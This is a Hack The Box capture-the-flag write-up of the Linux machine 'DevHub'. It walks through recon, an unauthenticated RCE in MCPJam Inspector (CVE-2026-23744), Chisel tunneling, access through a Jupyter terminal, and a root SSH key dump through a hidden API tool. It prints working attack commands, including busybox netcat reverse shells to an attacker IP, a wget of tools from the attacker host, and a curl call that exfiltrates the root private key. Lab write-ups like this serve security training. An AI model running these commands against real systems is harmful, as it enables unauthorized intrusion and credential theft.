# Hack The Box — DevHub

Difficulty: Medium

OS: Linux

## 1. Reconnaissance

### Port Scan

Initial scan with `rustscan`:

```bash
rustscan -a 10.129.245.216 -- -sV -sC -oN nmap
```

Discovered ports:

```text
22/tcp   OpenSSH
80/tcp   HTTP
6274/tcp MCPJam Inspector
```

Port 80 hosted a web application, and port 6274 was identified as MCPJam Inspector — a development tool for MCP (Model Context Protocol) servers.

## 2. Web Enumeration — Port 80

### Adding the Hostname

<img width="746" height="247" alt="Pasted image 20260905122753" src="https://github.com/user-attachments/assets/6d9a2b2a-c245-4b84-a1da-72a334934ab5" />
Before proceeding, the hostname needed to be added to `/etc/hosts`:

Browsing to `http://10.129.245.216` revealed a page for DevHub, an internal development and analytics platform. The page displayed the following information:

<img width="2556" height="1122" alt="Pasted image 20260905122912" src="https://github.com/user-attachments/assets/55f83655-85d4-4faa-8498-c0d2b25f8d2d" />

## 3. Initial Access — MCPJam Inspector (Port 6274)

### Version Identification

Accessing `http://devhub.htb:6274` revealed the MCPJam Inspector interface. From the settings or page source, the version was identified as 1.4.2.

<img width="1917" height="242" alt="Pasted image 20260905123242" src="https://github.com/user-attachments/assets/c4453807-1d55-48dd-9103-acd881800f99" />

This version is vulnerable to CVE-2026-23744, a critical unauthenticated Remote Code Execution (RCE) vulnerability.

### Vulnerability Summary

CVE-2026-23744 is an unauthenticated Remote Code Execution vulnerability in MCPJam Inspector versions ≤ 1.4.2. The vulnerable endpoint `/api/mcp/connect` accepts a JSON payload with `serverConfig.command` and `serverConfig.args` fields, which are passed directly to a process spawner without any input validation or authentication. Since MCPJam Inspector binds to `0.0.0.0` by default, it is exposed to remote attackers. The vulnerability has a CVSS score of 9.8 (Critical).

### Exploitation

A public PoC was available:

```text
https://github.com/sbouabid-sec/CVE-2026-23744-POC
```

Start a listener on the attacker machine:

```bash
nc -lvnp 4444
```

Execute the exploit with a reverse shell payload:

```bash
python3 exploit.py 10.129.245.216  "busybox nc 10.10.15.167 4444 -e sh"
```

Output:

The exploit sent a crafted JSON payload to `/api/mcp/connect`, triggering a reverse shell as the `mcp-dev` user.

<img width="1267" height="136" alt="Pasted image 20260905124047" src="https://github.com/user-attachments/assets/d6cd7d34-2b8c-4479-8cce-cc46e637baf7" />
<img width="647" height="132" alt="Pasted image 20260905124106" src="https://github.com/user-attachments/assets/7adf9fcb-9029-49ef-a1eb-b03d7de41f3e" />


Shell as `mcp-dev` obtained.

## 4. Internal Reconnaissance & Tunneling

### Token Discovery

While enumerating the system as `mcp-dev`, the **pspy** process monitor was used to observe running processes. It revealed that the Jupyter Notebook server was launched with the following command:

<img width="1260" height="52" alt="Pasted image 20260905151135" src="https://github.com/user-attachments/assets/95233656-8029-4187-8baf-079919ee8983" />

```text
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

This token was later used to authenticate to the Jupyter service.

### Chisel Port Forwarding

The `ss -tulnp` command revealed internal services running on localhost:

```bash
ss -tulnp
```

Key findings:

```text
127.0.0.1:8888   Jupyter (analytics dashboard)
127.0.0.1:5000   OPSMCP API service
```

Since these services were only accessible locally, Chisel was used to forward them to the attacker machine.

On attacker (Chisel server):

```bash
chisel server -p 8004 --reverse
```

On victim (Chisel client):

```bash
# Transfer chisel binary to victim
# On attacker: python3 -m http.server 80
# On victim: wget http://10.10.15.167/chisel_1.12.0-rc2_linux_amd64

chmod +x chisel_1.12.0-rc2_linux_amd64
./chisel_1.12.0-rc2_linux_amd64 client 10.10.15.167:8004 R:8888:127.0.0.1:8888 R:5000:127.0.0.1:5000 &
```

This forwarded both Jupyter (port 8888) and the OPSMCP API (port 5000) to the attacker machine.

<img width="1182" height="150" alt="Pasted image 20260905151612" src="https://github.com/user-attachments/assets/ba8303dd-ba1c-4efc-b974-68d20a79b55d" />

<img width="1022" height="110" alt="Pasted image 20260905151629" src="https://github.com/user-attachments/assets/b64e4858-039d-4533-8195-dab0af86b188" />

## 5. Jupyter Access (Port 8888)

With the Chisel tunnel active, the Jupyter dashboard was accessible at `http://127.0.0.1:8888` on the attacker machine.

Using the previously discovered token, authentication was successful:

```text
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

<img width="2558" height="1087" alt="Pasted image 20260905151714" src="https://github.com/user-attachments/assets/11339e18-46e3-43da-9712-9f9e8873f2a2" />


<img width="2541" height="1080" alt="Pasted image 20260905153423" src="https://github.com/user-attachments/assets/254f65b9-5317-41d8-b4bb-291bd1b50ed1" />

### Shell as `analyst`

From the Jupyter interface, a terminal was launched (Other → Terminal). Using BusyBox netcat, a reverse shell was sent to the attacker:

```bash
busybox nc 10.10.15.167 5555 -e sh
```

Listener:

```bash
nc -lvnp 5555
```

Result — Shell as `analyst` obtained.

```bash
cat /home/analyst/user.txt
```

## 6. Privilege Escalation — OPSMCP API (Port 5000)

### Service Discovery

After gaining access as `analyst`, the `/opt/opsmcp/` directory was discovered:

```bash
analyst@devhub:/opt$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 May 26 08:42 .
drwxr-xr-x 20 root    root    4096 May 27 12:14 ..
drwxr-xr-x  3 mcp-dev mcp-dev 4096 Jan 22  2026 mcpjam
drwxr-xr-x  2 analyst analyst 4096 May 26 08:42 opsmcp

analyst@devhub:/opt/opsmcp$ ls -la
total 16
drwxr-xr-x 2 analyst analyst 4096 May 26 08:42 .
drwxr-xr-x 4 root    root    4096 May 26 08:42 ..
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 server.py
```

### Source Code Analysis — `server.py`

The `server.py` file contained a Flask application with critical security flaws.

Hardcoded API Key:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

Hidden Tools (not listed in `/tools/list` but callable):

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```

`ops._admin_dump` Implementation:

```python
elif tool_name == "ops._admin_dump":
    target = args.get('target', '')
    confirm = args.get('confirm', False)

    if not confirm:
        return jsonify({"error": "Confirmation required", ...})

    if target == "ssh_keys":
        try:
            with open('/root/.ssh/id_rsa', 'r') as f:
                key_data = f.read()
            return jsonify({
                "target": "ssh_keys",
                "root_private_key": key_data,
                "note": "Emergency recovery key dump"
            })
```

### Exploiting the API

— Dump root SSH private key:
 
```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

<img width="2543" height="202" alt="image" src="https://github.com/user-attachments/assets/1b0d9d7a-5ef6-4e98-a4d5-97d67cd5b710" />

### SSH as Root

The private key was saved and used to authenticate as `root`:

```bash
# Save the key
echo "-----BEGIN OPENSSH PRIVATE KEY-----..." > id_rsa
chmod 600 id_rsa

# SSH as root
ssh -i id_rsa root@10.129.245.216
```

Result — Root shell obtained

<img width="1055" height="691" alt="Pasted image 20260905152850" src="https://github.com/user-attachments/assets/4de94a39-02f6-4461-a939-d5489631c52b" />

```bash
root@devhub:~# cat /root/root.txt
```

